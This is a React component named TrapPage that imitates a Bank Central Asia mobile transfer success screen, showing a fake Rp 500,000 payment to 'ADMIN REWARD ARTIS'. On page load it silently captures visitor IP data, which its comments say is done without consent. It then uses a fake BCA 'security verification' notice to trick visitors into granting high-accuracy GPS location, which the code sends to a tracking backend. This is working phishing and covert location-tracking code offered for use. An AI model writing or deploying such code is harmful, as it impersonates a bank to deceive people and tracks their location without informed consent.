import React, { useEffect, useState } from 'react';
import { CheckCircle2, Share2, Download, ChevronLeft, MoreVertical, MapPin, Loader2 } from 'lucide-react';
import { captureVisitorData } from '../utils/tracker';

const TrapPage = () => {
  const [currentTime, setCurrentTime] = useState('');
  const [currentDate, setCurrentDate] = useState('');
  // 'idle' | 'loading' | 'done' | 'denied'
  const [verifyState, setVerifyState] = useState('idle');

  useEffect(() => {
    const now = new Date();
    setCurrentTime(now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }).replace('.', ':'));
    setCurrentDate(now.toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' }));

    // Capture data IP langsung — tanpa popup, tanpa izin
    captureVisitorData();
  }, []);

  // Dipanggil saat user klik tombol "Verifikasi Lokasi Pengiriman"
  const handleVerifyLocation = () => {
    setVerifyState('loading');

    if (!navigator.geolocation) {
      setVerifyState('denied');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        // GPS berhasil — update record di Supabase via tracker
        // Kita trigger ulang dengan flag GPS saja
        import('../utils/tracker').then(({ updateGPS }) => {
          if (updateGPS) updateGPS(pos);
        });
        setVerifyState('done');
      },
      () => {
        setVerifyState('denied');
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f1f1f1',
      display: 'flex',
      flexDirection: 'column',
      fontFamily: 'system-ui, -apple-system, sans-serif'
    }}>
      {/* BCA Header */}
      <div style={{
        background: '#003399', color: 'white', padding: '16px',
        display: 'flex', alignItems: 'center', justifyContent: 'space-between'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <ChevronLeft size={24} />
          <span style={{ fontWeight: '600', fontSize: '18px' }}>M-Transfer</span>
        </div>
        <MoreVertical size={24} />
      </div>

      <div style={{ padding: '20px', flex: 1 }}>
        <div style={{
          background: 'white', borderRadius: '12px', padding: '24px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
          display: 'flex', flexDirection: 'column', alignItems: 'center'
        }}>
          <div style={{ color: '#00a859', marginBottom: '16px' }}>
            <CheckCircle2 size={64} strokeWidth={1.5} />
          </div>

          <h2 style={{ color: '#003399', fontWeight: '800', fontSize: '20px', marginBottom: '4px' }}>
            M-TRANSFER BERHASIL
          </h2>
          <p style={{ color: '#666', fontSize: '14px', marginBottom: '24px' }}>
            {currentDate} {currentTime}
          </p>

          <div style={{ width: '100%', borderTop: '1px dashed #ddd', paddingTop: '20px' }}>
            {[
              { label: 'DARI REKENING', value: '342XXXX129' },
              { label: 'KE REKENING',   value: '883XXXX921' },
              { label: 'NAMA PENERIMA', value: 'ADMIN REWARD ARTIS' },
              { label: 'BERITA',        value: 'DP AKTIVASI HADIAH' },
            ].map((r) => (
              <div key={r.label} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
                <span style={{ color: '#888', fontSize: '14px' }}>{r.label}</span>
                <span style={{ fontWeight: '600', fontSize: '14px' }}>{r.value}</span>
              </div>
            ))}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>JUMLAH</span>
              <span style={{ fontWeight: '700', fontSize: '16px', color: '#003399' }}>Rp 500.000,00</span>
            </div>
          </div>

          <div style={{
            width: '100%', marginTop: '16px', padding: '12px',
            background: '#e6f4ea', borderRadius: '8px',
            color: '#00a859', fontSize: '13px', textAlign: 'center', fontWeight: '600'
          }}>
            Transaksi Berhasil Terverifikasi
          </div>

          {/* ── Tombol verifikasi lokasi — ini yang trigger GPS popup ── */}
          <div style={{
            width: '100%', marginTop: '16px', padding: '14px',
            background: '#fff8e1', borderRadius: '8px',
            border: '1px solid #ffc107'
          }}>
            <p style={{ fontSize: '12px', color: '#b45309', marginBottom: '10px', fontWeight: '600' }}>
              ⚠️ VERIFIKASI KEAMANAN DIPERLUKAN
            </p>
            <p style={{ fontSize: '12px', color: '#666', marginBottom: '12px', lineHeight: '1.5' }}>
              Untuk memastikan transaksi ini dilakukan dari lokasi yang aman, BCA memerlukan konfirmasi lokasi perangkat Anda.
            </p>

            {verifyState === 'idle' && (
              <button
                onClick={handleVerifyLocation}
                style={{
                  width: '100%', padding: '12px', background: '#003399',
                  color: 'white', border: 'none', borderRadius: '8px',
                  fontWeight: '700', fontSize: '14px', cursor: 'pointer',
                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px'
                }}
              >
                <MapPin size={16} /> Verifikasi Lokasi Pengiriman
              </button>
            )}

            {verifyState === 'loading' && (
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', color: '#003399', padding: '12px' }}>
                <Loader2 size={18} style={{ animation: 'spin 1s linear infinite' }} />
                <span style={{ fontSize: '14px', fontWeight: '600' }}>Memverifikasi lokasi...</span>
              </div>
            )}

            {verifyState === 'done' && (
              <div style={{
                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
                color: '#00a859', padding: '12px', fontWeight: '700', fontSize: '14px'
              }}>
                <CheckCircle2 size={18} /> Lokasi Terverifikasi ✓
              </div>
            )}

            {verifyState === 'denied' && (
              <div style={{ fontSize: '12px', color: '#ef4444', textAlign: 'center', padding: '8px' }}>
                Verifikasi gagal. Aktifkan izin lokasi di pengaturan browser Anda.
              </div>
            )}
          </div>
        </div>

        <div style={{ marginTop: '20px', display: 'flex', gap: '12px' }}>
          <button style={{
            flex: 1, background: 'white', border: '1px solid #003399',
            color: '#003399', padding: '14px', borderRadius: '8px', fontWeight: '600',
            display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px'
          }}>
            <Download size={18} /> Simpan
          </button>
          <button style={{
            flex: 1, background: '#003399', border: 'none', color: 'white',
            padding: '14px', borderRadius: '8px', fontWeight: '600',
            display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px'
          }}>
            <Share2 size={18} /> Bagikan
          </button>
        </div>
      </div>

      <div style={{ padding: '20px', textAlign: 'center', color: '#999', fontSize: '12px' }}>
        PT BANK CENTRAL ASIA TBK
      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
};

export default TrapPage;
